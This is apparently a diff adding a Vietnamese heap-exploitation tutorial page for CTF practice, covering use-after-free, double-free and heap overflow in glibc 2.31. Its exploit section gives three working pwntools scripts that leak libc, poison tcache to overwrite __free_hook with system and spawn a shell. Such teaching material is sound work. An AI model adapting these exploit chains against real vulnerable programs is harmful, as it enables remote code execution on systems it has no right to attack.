+  <div class="note"><span class="tag">Nhận bug từ source</span>Soi hàm free: thiếu <code>ptr[idx]=NULL</code> → UAF; không kiểm <code>idx</code> đã free → double-free; <code>read(0,buf,SIZE_CỐ_ĐỊNH)</code> trong khi chunk size do user chọn nhỏ hơn → overflow.</div>
+ </div>
+</section>
+
+<!-- 08 Exploit thật -->
+<section class="block" id="s8">
+ <div class="wrap wide">
+  <div class="secnum">08 / EXPLOIT ĐẦY ĐỦ — UAF → LEAK → __free_hook → SHELL</div>
+  <h2>Chuỗi hoàn chỉnh (glibc 2.31)</h2>
+  <p>Minh họa chuỗi dùng UAF: (1) free chunk lớn, UAF-read leak libc; (2) UAF-edit fd tcache về <code>__free_hook</code>; (3) ghi <code>system</code>; (4) free một chunk chứa <code>"/bin/sh"</code>. Số liệu cho <strong>glibc 2.31 Ubuntu 20.04</strong>.</p>
+  <pre><code><span class="c">// chall.c — menu: 1=alloc(i,sz,data) 2=free(i)[UAF] 3=edit(i,data) 4=show(i)</span>
+<span class="c">// gcc chall.c -o chall ; patchelf --replace-needed libc.so.6 ./libc.so.6 chall</span></code></pre>
+
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — glibc 2.31, còn __free_hook. Chuỗi từ bug UAF, số thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe  = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+<span class="k">def</span> alloc(i,sz,d=b<span class="s">"A"</span>):
+    p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"1"</span>);p.sendlineafter(b<span class="s">"idx"</span>,<span class="k">str</span>(i).encode())
+    p.sendlineafter(b<span class="s">"size"</span>,<span class="k">str</span>(sz).encode());p.sendafter(b<span class="s">"data"</span>,d)
+<span class="k">def</span> free(i): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"2"</span>);p.sendlineafter(b<span class="s">"idx"</span>,<span class="k">str</span>(i).encode())
+<span class="k">def</span> edit(i,d): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"3"</span>);p.sendlineafter(b<span class="s">"idx"</span>,<span class="k">str</span>(i).encode());p.sendafter(b<span class="s">"data"</span>,d)
+<span class="k">def</span> show(i): p.sendlineafter(b<span class="s">"&gt;"</span>,b<span class="s">"4"</span>);p.sendlineafter(b<span class="s">"idx"</span>,<span class="k">str</span>(i).encode());<span class="k">return</span> p.recvline()
+
+<span class="c"># 1) LEAK LIBC: chunk 0x500 → unsorted → UAF read fd</span>
+alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); alloc(<span class="d">1</span>,<span class="d">0x18</span>)   <span class="c"># 1 = chunk chặn</span>
+free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+<span class="k">assert</span> libc.address &amp; <span class="d">0xfff</span> == <span class="d">0</span>
+log.success(<span class="s">f"libc = {hex(libc.address)}"</span>)   <span class="c"># system=+0x52290 __free_hook=+0x1eee48</span>
+
+<span class="c"># 2) TCACHE POISONING qua UAF-edit fd (2.31: fd thô, không safe-link)</span>
+alloc(<span class="d">2</span>,<span class="d">0x40</span>); free(<span class="d">2</span>)                 <span class="c"># 2 → tcache[0x40]</span>
+edit(<span class="d">2</span>, p64(libc.sym.__free_hook))      <span class="c"># fd = &amp;__free_hook</span>
+alloc(<span class="d">3</span>,<span class="d">0x40</span>)                          <span class="c"># lấy chunk 2</span>
+alloc(<span class="d">4</span>,<span class="d">0x40</span>)                          <span class="c"># CHUNK 4 == &amp;__free_hook</span>
+
+<span class="c"># 3) GHI system vào __free_hook</span>
+edit(<span class="d">4</span>, p64(libc.sym.system))
+
+<span class="c"># 4) free chunk chứa "/bin/sh" → system("/bin/sh")</span>
+alloc(<span class="d">5</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); free(<span class="d">5</span>)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật phiên bản</span>glibc <b>≥2.34 bỏ __free_hook</b> → thay bằng <a href="fsop.html">FSOP</a>/<a href="house_of_apple2.html">apple2</a>/<a href="exit_handlers.html">exit handler</a>. glibc <b>≥2.32</b> có <a href="tcache_fastbin.html">safe-linking</a> → bước (2) phải mã hóa fd <code>(pos&gt;&gt;12)^target</code> (cần leak heap). Code trên chuẩn cho <b>2.27–2.31</b>. Dùng <code>libc.sym.X</code> thay vì hardcode để robust.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools gọn; libc.sym tự có offset thật.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>)
+libc = ELF(<span class="s">"./libc.so.6"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+<span class="c"># ... alloc/free/edit/show như bản A ...</span>
+alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); alloc(<span class="d">1</span>,<span class="d">0x18</span>); free(<span class="d">0</span>)
+libc.address = u64(show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)) - <span class="d">0x1ecbe0</span>
+alloc(<span class="d">2</span>,<span class="d">0x40</span>); free(<span class="d">2</span>); edit(<span class="d">2</span>,p64(libc.sym.__free_hook))
+alloc(<span class="d">3</span>,<span class="d">0x40</span>); alloc(<span class="d">4</span>,<span class="d">0x40</span>); edit(<span class="d">4</span>,p64(libc.sym.system))
+alloc(<span class="d">5</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); free(<span class="d">5</span>)
+p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Mẹo kiểm nhanh</span>In <code>hex(libc.address)</code> ngay sau leak: phải kết thúc <code>000</code>. Sai offset = ra số lẻ → dừng, soi gdb (chunk gộp top? vào tcache?).</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld: Menu + rebase_libc + safe-linking helper.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./chall"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start(); GDB(); m = Menu(prompt=b<span class="s">"&gt;"</span>)
+
+m.alloc(<span class="d">0</span>,<span class="d">0x4f8</span>); m.alloc(<span class="d">1</span>,<span class="d">0x18</span>); m.free(<span class="d">0</span>)
+rebase_libc(leak=u64(m.show(<span class="d">0</span>)[:<span class="d">8</span>].ljust(<span class="d">8</span>,b<span class="s">"\x00"</span>)), offset=<span class="d">0x1ecbe0</span>)
+m.alloc(<span class="d">2</span>,<span class="d">0x40</span>); m.free(<span class="d">2</span>)
+m.edit(<span class="d">2</span>, protect_ptr(<span class="d">0</span>, LIBC.sym.__free_hook))   <span class="c"># safe-link nếu ≥2.32 (2.31: =target)</span>
+m.alloc(<span class="d">3</span>,<span class="d">0x40</span>); m.alloc(<span class="d">4</span>,<span class="d">0x40</span>); m.edit(<span class="d">4</span>, p64(LIBC.sym.system))
+m.alloc(<span class="d">5</span>,<span class="d">0x20</span>,b<span class="s">"/bin/sh\x00"</span>); m.free(<span class="d">5</span>); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>protect_ptr(pos,target)</code> = <code>(pos&gt;&gt;12)^target</code> (an toàn cho cả 2.31 nếu pos=0 → trả target). <code>rebase_libc</code> trừ offset.</div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Công cụ -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">pwndbg bins/tcache</div><h4>Thấy bug</h4><p>Bin vòng/trùng, count sai = double-free.</p></div>
+    <div class="card"><div class="term">vis_heap_chunks</div><h4>Overlap</h4><p>Nhìn ra hai chunk chồng vùng.</p></div>
+    <div class="card"><div class="term">AddressSanitizer</div><h4>Xác nhận UAF/DF</h4><p>Compile <code>-fsanitize=address</code> để lộ bug khi dev-test.</p></div>
+    <div class="card"><div class="term">how2heap</div><h4>POC mẫu</h4><p><code>fastbin_dup</code>, <code>tcache_poisoning</code>, <code>overlapping_chunks</code>.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Gỡ lỗi -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / GỠ LỖI — KHI BUG KHÔNG "ĂN"</h2>
+  <div class="secnum" style="visibility:hidden">x</div>
+  <div class="grid">
+    <div class="card"><h4>"double free detected in tcache 2"</h4><p>tcache key bắt. Xen free chunk khác, hoặc UAF-edit xóa key (ghi 0 vào chunk+0x18), hoặc dùng fastbin (làm đầy tcache trước).</p></div>
+    <div class="card"><h4>fd đọc ra số lạ (không phải libc/heap)</h4><p>Safe-linking (≥2.32): fd = <code>(addr&gt;&gt;12)^next</code>. Phải leak heap để giải mã; hoặc version ≥2.32 mà bạn tưởng 2.31.</p></div>
+    <div class="card"><h4>"invalid pointer" khi free</h4><p>Con trỏ lệch (data vs header), hoặc chunk không căn 0x10. Nhớ con trỏ = chunk+0x10.</p></div>
+    <div class="card"><h4>__free_hook không tồn tại</h4><p>glibc ≥2.34. <code>libc.sym.__free_hook</code> = None. Đổi FSOP/exit handler.</p></div>
+    <div class="card"><h4>Overflow không tới chunk kế</h4><p>Chunk không liền kề (bin/tcache xen giữa). Alloc liên tiếp để chúng cạnh nhau trên heap.</p></div>
+    <div class="card"><h4>"corrupted size vs. prev_size"</h4><p>Forge size thiếu bit P hoặc sai bội số 0x10. Dùng <code>size|1</code>, bội số 0x10.</p></div>
+    <div class="card"><h4>Chunk gộp mất khi free</h4><p>Free cạnh chunk free khác (không-tcache) → consolidate làm hỏng bố cục. Chèn chunk chặn hoặc giữ trong tcache.</p></div>
+    <div class="card"><h4>malloc không trả về đích sau poisoning</h4><p>tcache count=0 (glibc không lấy). Free thêm 1 chunk cùng size để count&gt;0, hoặc sửa count trong tcache_perthread.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 11 Biến thể -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / BIẾN THỂ GLIBC</div>
+  <h2>Bug cùng loại, rào khác nhau</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>glibc</th><th>tcache key</th><th>safe-link fd</th><th>__free_hook</th><th>Double-free dễ nhất</th></tr></thead>
+    <tbody>
+      <tr><td>2.23</td><td class="no">không có tcache</td><td class="no">—</td><td class="yes">có</td><td>fastbin dup (không key)</td></tr>
+      <tr><td>2.27</td><td class="no">chưa</td><td class="no">thô</td><td class="yes">có</td><td>tcache dup tự do (chưa key)</td></tr>
+      <tr><td>2.31 (mẫu)</td><td class="yes">có</td><td class="no">thô</td><td class="yes">có</td><td>xen free / xóa key / fastbin</td></tr>
+      <tr><td>2.32–2.33</td><td class="yes">có</td><td class="yes">mã hóa</td><td class="yes">có</td><td>như 2.31 + leak heap cho poisoning</td></tr>
+      <tr><td>≥2.34</td><td class="yes">có</td><td class="yes">mã hóa</td><td class="no">BỎ</td><td>poisoning + FSOP thay hook</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">x86 (32-bit)</span>Header 0x8, align 0x8, MINSIZE 0x10. tcache/fast tương tự nhưng con trỏ 4 byte; <code>u32</code>/<code>p32</code> thay cho 64-bit. Offset libc 32-bit khác hẳn — tính riêng.</div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">UAF</div><p>Dùng con trỏ sau free.</p></div>
+    <div class="card"><div class="term">dangling pointer</div><p>Con trỏ còn trỏ vào chunk đã free.</p></div>
+    <div class="card"><div class="term">double-free</div><p>Free cùng chunk 2 lần.</p></div>
+    <div class="card"><div class="term">overlap</div><p>Hai chunk cùng chiếm một vùng nhớ.</p></div>
+    <div class="card"><div class="term">tcache key</div><p>chunk+0x18 = &tcache_perthread; chống double-free.</p></div>
+    <div class="card"><div class="term">safe-linking</div><p>fd = (addr>>12)^next (≥2.32).</p></div>
+    <div class="card"><div class="term">__free_hook</div><p>Hook gọi khi free (bỏ từ 2.34).</p></div>
+    <div class="card"><div class="term">off-by-one</div><p>Tràn đúng 1 byte vào size chunk kế.</p></div>
+    <div class="card"><div class="term">consolidate</div><p>Gộp chunk free kề nhau (không-tcache).</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Trước: <a href="heap_internals.html">heap_internals</a>. Tiếp: <a href="tcache_fastbin.html">tcache_fastbin</a> · <a href="unsorted_largebin.html">unsorted_largebin</a> · <a href="hook_overwrite.html">hook_overwrite</a>.</li>
+    <li>shellphish how2heap: <code>fastbin_dup</code>, <code>tcache_poisoning</code>, <code>overlapping_chunks</code>, <code>tcache_house_of_spirit</code>.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 4 · Bài 19.</strong> UAF / double-free / heap overflow = ba cách chạm vào metadata chunk free. Một mình chỉ gây rối; ghép với poisoning/FSOP mới thành ghi tùy ý → RCE. 2.31: leak = <code>fd − 0x1ecbe0</code>, __free_hook còn dùng. Tiếp theo: tcache & fastbin poisoning.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("hpb-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("hpb-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var bin=[], log=[];
+  var binEl=document.getElementById("bin"),logEl=document.getElementById("slog");
+  function render(){
+    binEl.innerHTML = bin.length? bin.map(function(x,i){
+      var dup = bin.filter(function(y){return y===x;}).length>1;
+      return '<div class="node'+(dup?' dup':'')+'"><span>tcache[0x40] ['+i+']</span><span>chunk '+x+(dup?'  ⚠️ TRÙNG':'')+'</span></div>';
+    }).join("") : '<div style="color:var(--muted)">(bin rỗng — tcache[0x40])</div>';
+    logEl.textContent = log.slice(-6).join("\n");
+  }
+  function push(m){log.push(m);}
+  var ops={
+    free:function(){ if(bin[bin.length-1]==="A"){push("⚠️ free(A): A đang ở đỉnh bin → tcache key bắt double-free (abort thật).");}
+      bin.push("A"); push("free(A) → đẩy A vào tcache (LIFO). đỉnh = A"); },
+    freeB:function(){ bin.push("B"); push("free(B) → đỉnh = B (đã xen giữa 2 lần free A)"); },
+    freeA2:function(){
+      if(bin[bin.length-1]==="A"){ push("❌ ABORT: free(A) khi A đang ở ĐỈNH → tcache key bắt. Hãy free(B) xen trước (hoặc xóa key)."); }
+      else { bin.push("A"); push("⚠️ free(A) lần 2 (đỉnh != A). A giờ nằm 2 lần trong bin → VÒNG! (thực tế vẫn cần key=0 để qua)"); }
+    },
+    malloc:function(){ if(!bin.length){push("malloc(): bin rỗng → cắt từ top chunk.");return;}
+      var c=bin.pop(); push("malloc() → trả chunk "+c+(bin.indexOf(c)>=0?"  ← "+c+" VẪN trong bin → malloc sau trả TRÙNG "+c+"!":"")); },
+    reset:function(){ bin=[]; log=[]; push("reset. A,B đã cấp. Thử: free(A)→free(B)→free(A) lần 2→malloc×3."); }
+  };
+  document.getElementById("sbx").addEventListener("click",function(e){
+    var op=e.target.getAttribute("data-op"); if(!op)return; ops[op](); render();
+  });
+  ops.reset(); render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
